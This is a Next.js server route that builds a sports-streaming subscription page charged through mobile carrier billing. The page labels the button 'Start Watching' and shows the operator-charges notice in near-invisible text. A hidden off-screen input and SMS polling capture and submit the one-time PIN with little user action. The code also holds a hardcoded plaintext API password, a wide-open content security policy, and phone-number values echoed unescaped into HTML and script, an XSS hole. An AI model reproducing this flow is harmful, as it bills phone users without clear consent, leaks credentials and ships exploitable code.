import { NextRequest } from 'next/server';

const PIN_REQUEST_URL =
  'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';

const SERVER_PARAMS = {
  UserId: '166',
  Password: 'Mobility_MI@123',
  ProductId: '479',
  TelcoId: '7',
  ShortCode: '50995',
  ConfirmButtonHTMLId: 'confirmBtn',
  CampaignURL: '',
  ContentURL: '',
};

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const msisdn = searchParams.get('msisdn') || '';
  const trxId = searchParams.get('trxId') || '';
  const userIP = searchParams.get('userIP') || '127.0.0.1';

  if (!msisdn || !trxId) {
    return new Response('Missing msisdn or trxId', { status: 400 });
  }

  // ── Call PinRequest server-side to get Evina JS ─────────────────────────
  let evinaJS = '';
  let pinRequestStatus = '';
  let usedTrxId = trxId;

  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const payload = {
        MSISDN: msisdn,
        TransactionId: usedTrxId,
        Headers: request.headers.get('user-agent') || '',
        UserIP: userIP,
        ...SERVER_PARAMS,
      };

      console.log(`[otp-page] PinRequest attempt ${attempt}:`, { ...payload, Password: '***' });

      const res = await fetch(PIN_REQUEST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const raw = await res.json();
      pinRequestStatus = String(raw.Status ?? raw.status ?? raw.STATUS ?? '');
      evinaJS = String(raw.JS ?? raw.js ?? raw.Javascript ?? '');

      evinaJS = evinaJS
        .trim()
        .replace(/^<script[^>]*>/i, '')
        .replace(/<\/script\s*>$/i, '')
        .trim();

      console.log(`[otp-page] Attempt ${attempt} → Status: ${pinRequestStatus}, JS len: ${evinaJS.length}`);

      if (pinRequestStatus === '0' && evinaJS.length > 0) break;

      if (attempt < 3) {
        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
        await new Promise(r => setTimeout(r, 1000));
      }
    } catch (err) {
      console.error(`[otp-page] PinRequest attempt ${attempt} error:`, err);
      pinRequestStatus = 'error';
      if (attempt < 3) {
        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
        await new Promise(r => setTimeout(r, 1000));
      }
    }
  }

  const masked = msisdn.length > 5
    ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}***${msisdn.slice(-3)}`
    : msisdn;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>XoomSports — Verify</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh;
      background: #0b0e14;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow-x: hidden;
    }

    .bg-glow {
      position: fixed;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 600px;
      height: 300px;
      background: rgba(226, 56, 58, 0.06);
      border-radius: 50%;
      filter: blur(100px);
      pointer-events: none;
    }

    /* Top bar */
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      position: relative;
      z-index: 10;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .brand-icon {
      width: 36px;
      height: 36px;
      background: #e2383a;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .brand-icon svg { width: 20px; height: 20px; color: white; }
    .brand-name {
      font-size: 18px;
      font-weight: 800;
      color: white;
      letter-spacing: -0.3px;
    }
    .brand-name span { color: #e2383a; }

    .step-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      padding: 6px 12px;
    }
    .step-dot {
      width: 6px; height: 6px;
      border-radius: 50%;
      background: rgba(255,255,255,0.2);
    }
    .step-dot.active { background: #e2383a; }

    /* Main content */
    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      position: relative;
      z-index: 10;
    }
    .wrapper { width: 100%; max-width: 380px; }

    .card {
      background: #141923;
      border-radius: 20px;
      border: 1px solid rgba(255,255,255,0.05);
      padding: 28px 24px;
      position: relative;
    }

    /* Phase 1 */
    .match-preview {
      background: linear-gradient(135deg, #1a1f2e, #141923);
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,0.05);
      padding: 20px;
      margin-bottom: 20px;
      text-align: center;
    }
    .match-preview .label {
      font-size: 10px;
      font-weight: 700;
      color: rgba(255,255,255,0.3);
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 12px;
    }
    .match-preview h2 {
      font-size: 22px;
      font-weight: 800;
      color: white;
      line-height: 1.3;
    }
    .match-preview h2 em {
      font-style: normal;
      color: #e2383a;
    }
    .match-preview p {
      color: rgba(255,255,255,0.35);
      font-size: 13px;
      margin-top: 6px;
    }
    .feature-list {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-top: 16px;
    }
    .feature-tag {
      font-size: 11px;
      font-weight: 600;
      color: rgba(255,255,255,0.5);
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      padding: 5px 10px;
    }

    /* Phase 2 */
    .verify-header { text-align: center; margin-bottom: 24px; }
    .verify-icon {
      width: 60px; height: 60px;
      background: rgba(226, 56, 58, 0.1);
      border-radius: 50%;
      margin: 0 auto 14px;
      display: flex; align-items: center; justify-content: center;
    }
    .verify-icon svg { width: 28px; height: 28px; color: #e2383a; }
    .verify-header h2 {
      font-size: 20px;
      font-weight: 800;
      color: white;
    }
    .verify-header p {
      color: rgba(255,255,255,0.4);
      font-size: 13px;
      margin-top: 4px;
    }
    .verify-header p b { color: rgba(255,255,255,0.7); font-weight: 700; }

    /* OTP inputs */
    .otp-row {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin: 20px 0 10px;
    }
    .otp-input {
      width: 58px;
      height: 64px;
      text-align: center;
      font-size: 24px;
      font-weight: 800;
      border: 2px solid rgba(255,255,255,0.08);
      border-radius: 14px;
      outline: none;
      transition: all 0.2s;
      background: rgba(255,255,255,0.03);
      color: white;
      -webkit-appearance: none;
    }
    .otp-input:focus {
      border-color: #e2383a;
      background: rgba(226, 56, 58, 0.05);
      box-shadow: 0 0 0 3px rgba(226, 56, 58, 0.1);
    }
    .otp-input.error {
      border-color: #ef4444;
      background: rgba(239, 68, 68, 0.08);
    }

    .error-msg {
      text-align: center;
      color: #ef4444;
      font-size: 13px;
      font-weight: 500;
      min-height: 22px;
      margin-bottom: 12px;
    }

    /* Button */
    .btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
      min-height: 54px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .btn-primary {
      background: #e2383a;
      color: white;
      box-shadow: 0 6px 20px rgba(226, 56, 58, 0.25);
    }
    .btn-primary:hover {
      background: #c42f31;
      box-shadow: 0 8px 28px rgba(226, 56, 58, 0.35);
      transform: translateY(-1px);
    }
    .btn-primary:active { transform: translateY(0); }

    /* Spinner */
    .spinner {
      width: 20px; height: 20px;
      border: 2.5px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    .spinner-lg {
      width: 44px; height: 44px;
      border: 3px solid rgba(226, 56, 58, 0.15);
      border-top-color: #e2383a;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Resend */
    .resend {
      text-align: center;
      margin-top: 18px;
      font-size: 13px;
      color: rgba(255,255,255,0.3);
    }
    .resend a {
      color: #e2383a;
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
    }
    .resend a:hover { text-decoration: underline; }

    /* Trust & terms */
    .trust {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-top: 20px;
      padding-top: 16px;
      border-top: 1px solid rgba(255,255,255,0.04);
    }
    .trust-item {
      display: flex;
      align-items: center;
      gap: 4px;
      color: rgba(255,255,255,0.2);
      font-size: 11px;
      font-weight: 500;
    }
    .trust-item svg { width: 13px; height: 13px; }

    .terms {
      text-align: center;
      font-size: 10px;
      color: rgba(255,255,255,0.12);
      margin-top: 14px;
      line-height: 1.5;
    }

    /* Debug */
    .debug-toggle {
      display: block;
      width: 100%;
      text-align: center;
      margin-top: 20px;
      font-size: 10px;
      color: rgba(255,255,255,0.1);
      text-decoration: underline;
      cursor: pointer;
      background: none;
      border: none;
    }
    .debug-panel {
      margin-top: 8px;
      background: rgba(0,0,0,0.4);
      border-radius: 10px;
      padding: 10px;
      font-size: 10px;
      color: rgba(255,255,255,0.4);
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 200px;
      overflow: auto;
      font-family: monospace;
      line-height: 1.6;
    }

    /* Animations */
    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
    .shake { animation: shake 0.4s ease-in-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
    .fade-in { animation: fadeIn 0.4s ease-out; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    .pulse { animation: pulse 2s ease-in-out infinite; }
    .phase-hidden { display: none !important; }
  </style>
  ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS returned -->'}
</head>
<body>
  <div class="bg-glow"></div>

  <!-- Evina required elements -->
  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - Télécharger - CONTINUER - ENTRER - S'ABONNER - اشترك الآن - VOIR - ACCEPT - اشترك الان - الاشتراك</a>
  <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
  <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>

  <!-- Top bar -->
  <div class="topbar">
    <div class="brand">
      <div class="brand-icon">
        <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
      </div>
      <div class="brand-name">XOOM<span>SPORTS</span></div>
    </div>
    <div class="step-badge">
      <div class="step-dot active"></div>
      <div class="step-dot" id="stepDot2"></div>
      <div class="step-dot" id="stepDot3"></div>
    </div>
  </div>

  <div class="main">
    <div class="wrapper">
      <div class="card fade-in">
        <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
        <div id="phase1">
          <div class="match-preview">
            <div class="label">Unlock Premium Access</div>
            <h2>Watch Live Football<br><em>Anytime, Anywhere</em></h2>
            <p>All leagues &bull; All matches &bull; HD streaming</p>
            <div class="feature-list">
              <div class="feature-tag">⚽ Premier League</div>
              <div class="feature-tag">🏆 UCL</div>
              <div class="feature-tag">📺 HD</div>
            </div>
          </div>
        </div>

        <!-- ═══════ PHASE 2: Auto-verify / Manual entry ═══════ -->
        <div id="phase2" class="phase-hidden">
          <!-- Auto-verify spinner -->
          <div id="autoVerify">
            <div class="verify-header">
              <div class="verify-icon">
                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
                </svg>
              </div>
              <h2>Verifying...</h2>
              <p>Reading SMS automatically</p>
            </div>
            <div class="spinner-lg" style="margin: 24px auto"></div>
            <p style="text-align:center;color:rgba(255,255,255,0.25);font-size:12px" class="pulse">Allow SMS permission when prompted</p>
            <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
                   style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
                   maxlength="6">
          </div>

          <!-- Manual fallback -->
          <div id="manualEntry" class="phase-hidden">
            <div class="verify-header">
              <div class="verify-icon">
                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
                </svg>
              </div>
              <h2>Enter Verification Code</h2>
              <p>PIN sent to <b>${masked}</b></p>
            </div>

            <div class="otp-row" id="otpRow">
              <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
            </div>

            <div class="error-msg" id="errorMsg"></div>
          </div>
        </div>

        <!-- Confirm button — Evina monitors this -->
        <button class="btn btn-primary" id="confirmBtn">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
            <polygon points="5 3 19 12 5 21 5 3"/>
          </svg>
          Start Watching
        </button>

        <p class="resend phase-hidden" id="resendArea">
          Didn't receive it? <a id="resendLink" onclick="handleResend()">Resend</a>
        </p>

        <div class="trust" id="trustSignals">
          <div class="trust-item">
            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
            Secure
          </div>
          <div class="trust-item">
            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
            Verified
          </div>
          <div class="trust-item">
            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
            Instant
          </div>
        </div>

        <p class="terms">
          By subscribing you agree to our Terms &amp; Conditions.<br>
          Standard operator charges apply.
        </p>

        <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
        <div class="debug-panel" id="debugPanel" style="display:none"></div>
      </div>
    </div>
  </div>

  <script>
    // ── State ───────────────────────────────────────────────────────────────
    var MSISDN = ${JSON.stringify(msisdn)};
    var TRXID  = ${JSON.stringify(usedTrxId)};
    var PIN_REQUEST_STATUS = ${JSON.stringify(pinRequestStatus)};
    var EVINA_JS_LEN = ${evinaJS.length};
    var isVerifying = false;
    var resendCooldown = 0;
    var phase = 1;

    var pins = document.querySelectorAll('.otp-input');
    var confirmBtn = document.getElementById('confirmBtn');
    var errorMsg = document.getElementById('errorMsg');
    var otpValue = document.getElementById('otpValue');

    function dbg(msg) {
      var ts = new Date().toLocaleTimeString();
      var line = '[' + ts + '] ' + msg;
      console.log(line);
      var p = document.getElementById('debugPanel');
      if (p) p.textContent = (p.textContent || '') + '\\n' + line;
    }
    function toggleDebug() {
      var p = document.getElementById('debugPanel');
      var t = document.getElementById('debugToggle');
      if (p.style.display === 'none') {
        p.style.display = 'block';
        t.textContent = 'Hide technical details';
      } else {
        p.style.display = 'none';
        t.textContent = 'Show technical details';
      }
    }

    dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID + ' evinaJS=' + (EVINA_JS_LEN > 0 ? 'yes(' + EVINA_JS_LEN + 'chars)' : 'NO'));
    dbg('PinRequest Status: ' + PIN_REQUEST_STATUS);
    dbg('Evina JS in <head>: ' + (EVINA_JS_LEN > 0 ? 'YES (server-rendered)' : 'NO'));
    dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
    dbg('Flow: Permission-based (Click → Web OTP permission → auto verify → manual fallback)');

    // ── OTP Input handling ────────────────────────────────────────────────
    function getFullPin() {
      var val = '';
      pins.forEach(function(p) { val += p.value; });
      return val.replace(/\\D/g, '');
    }

    pins.forEach(function(input, i) {
      input.addEventListener('input', function() {
        var val = input.value.replace(/\\D/g, '');
        if (val.length > 1 && i === 0) {
          var code = val.slice(0, 4);
          dbg('Keyboard autofill detected: "' + code + '"');
          for (var j = 0; j < 4; j++) { pins[j].value = code[j] || ''; }
          if (otpValue) otpValue.value = code;
          clearError();
          if (code.length === 4) {
            pins[3].focus();
            if (phase === 2) {
              dbg('Auto-verifying from keyboard autofill');
              setTimeout(function() { verifyPin(code); }, 300);
            }
          }
          return;
        }
        input.value = val.slice(-1);
        clearError();
        if (val && i < 3) pins[i + 1].focus();
        var full = getFullPin();
        if (otpValue) otpValue.value = full;
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (input.value) { input.value = ''; }
          else if (i > 0) { pins[i - 1].focus(); }
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\\D/g, '').slice(0, 4);
        for (var j = 0; j < 4; j++) { pins[j].value = text[j] || ''; }
        if (otpValue) otpValue.value = text;
        clearError();
        pins[Math.min(text.length, 3)].focus();
      });
    });

    function showError(msg) {
      errorMsg.textContent = msg;
      pins.forEach(function(p) { p.classList.add('error'); });
      document.getElementById('otpRow').classList.add('shake');
      setTimeout(function() { document.getElementById('otpRow').classList.remove('shake'); }, 500);
    }
    function clearError() {
      errorMsg.textContent = '';
      pins.forEach(function(p) { p.classList.remove('error'); });
    }

    // ── Phase transitions ───────────────────────────────────────────────────
    var otpPollTimer = null;
    var otpTimeout = null;
    var webOtpAbort = null;

    function goToPhase2() {
      phase = 2;
      document.getElementById('phase1').classList.add('phase-hidden');
      document.getElementById('phase2').classList.remove('phase-hidden');
      document.getElementById('trustSignals').classList.add('phase-hidden');
      document.getElementById('stepDot2').classList.add('active');
      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';

      startWebOTP();

      var hiddenOtp = document.getElementById('hiddenOtp');
      setTimeout(function() { hiddenOtp.focus(); }, 50);

      hiddenOtp.addEventListener('input', function() {
        var val = hiddenOtp.value.replace(/\\D/g, '');
        if (val.length >= 4) {
          dbg('Hidden OTP input event: "' + val.slice(0, 4) + '"');
          captureAndVerify(val.slice(0, 4));
        }
      });

      dbg('Polling hidden OTP input for autofill...');
      otpPollTimer = setInterval(function() {
        var val = hiddenOtp.value.replace(/\\D/g, '');
        if (val.length >= 4) {
          dbg('Poll detected OTP: "' + val.slice(0, 4) + '"');
          captureAndVerify(val.slice(0, 4));
        }
      }, 300);

      otpTimeout = setTimeout(function() {
        dbg('Auto-verify timeout (30s) — showing manual entry');
        clearInterval(otpPollTimer);
        if (webOtpAbort) webOtpAbort.abort();
        showManualEntry();
      }, 30000);
    }

    function startWebOTP() {
      if (!('OTPCredential' in window)) {
        dbg('Web OTP API not available — will rely on autofill/manual');
        return;
      }

      dbg('Web OTP: Requesting SMS permission...');
      webOtpAbort = new AbortController();

      navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: webOtpAbort.signal
      }).then(function(otp) {
        if (!otp) {
          dbg('Web OTP: User denied permission or no SMS');
          return;
        }
        var code = otp.code;
        if (!code) return;

        dbg('Web OTP: Permission granted, got code "' + code + '"');
        var cleaned = code.replace(/\\D/g, '').slice(0, 4);
        if (cleaned.length >= 4) {
          captureAndVerify(cleaned);
        }
      }).catch(function(err) {
        dbg('Web OTP error: ' + (err.message || err));
      });
    }

    function captureAndVerify(code) {
      if (isVerifying) return;
      clearInterval(otpPollTimer);
      clearTimeout(otpTimeout);
      if (webOtpAbort) webOtpAbort.abort();

      document.getElementById('autoVerify').classList.add('phase-hidden');
      document.getElementById('manualEntry').classList.remove('phase-hidden');
      for (var i = 0; i < 4; i++) { pins[i].value = code[i] || ''; }
      if (otpValue) otpValue.value = code;

      dbg('Auto-captured OTP: "' + code + '" — verifying now');
      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
      setTimeout(function() { verifyPin(code); }, 300);
    }

    function showManualEntry() {
      document.getElementById('autoVerify').classList.add('phase-hidden');
      document.getElementById('manualEntry').classList.remove('phase-hidden');
      document.getElementById('resendArea').classList.remove('phase-hidden');
      confirmBtn.textContent = 'Verify Code';
      setTimeout(function() { pins[0].focus(); }, 100);
      dbg('Manual OTP entry — waiting for user input');
    }

    dbg('OTP strategy: Web OTP permission + autofill polling + 30s manual fallback');

    // ── Confirm button ──────────────────────────────────────────────────────
    confirmBtn.addEventListener('click', function() {
      dbg('confirmBtn clicked — phase=' + phase);

      if (phase === 1) {
        goToPhase2();
      } else if (phase === 2) {
        var pin = getFullPin();
        if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
          pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
        }
        dbg('Manual verify — pin="' + pin + '"');
        if (pin.length !== 4 || isVerifying) return;
        verifyPin(pin);
      }
    });

    // ── Verify PIN ──────────────────────────────────────────────────────────
    function verifyPin(pin) {
      isVerifying = true;
      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
      clearError();
      dbg('Verifying PIN: "' + pin + '" (len=' + pin.length + ')');

      fetch('/api/pin-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ TransactionId: TRXID, Pin: pin, MSISDN: MSISDN })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        dbg('PinVerify → Status="' + data.Status + '"');
        if (data.Status === '0' || data.Status === '103') {
          dbg('SUCCESS — redirecting');
          document.getElementById('stepDot3').classList.add('active');
          window.location.href = '/thankyou';
        } else {
          showManualEntry();
          showError('Invalid code (error: ' + data.Status + '). Try again.');
          pins.forEach(function(p) { p.value = ''; });
          if (otpValue) otpValue.value = '';
          setTimeout(function() { pins[0].focus(); }, 50);
        }
      })
      .catch(function(err) {
        dbg('PinVerify ERROR: ' + err);
        showManualEntry();
        showError('Network error. Please try again.');
      })
      .finally(function() {
        isVerifying = false;
        if (phase === 2) {
          var manual = document.getElementById('manualEntry');
          if (!manual.classList.contains('phase-hidden')) {
            confirmBtn.textContent = 'Verify Code';
          }
        }
      });
    }

    function handleResend() {
      if (resendCooldown > 0) return;
      dbg('Resending OTP — full page reload with new trxId...');
      var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
      window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=127.0.0.1';
    }
  </script>
</body>
</html>`;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Content-Security-Policy': [
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "connect-src * wss: ws: https: http: data: blob:",
        "style-src * 'unsafe-inline'",
        "img-src * data: blob:",
        "font-src * data:",
        "frame-src *",
      ].join('; '),
    },
  });
}
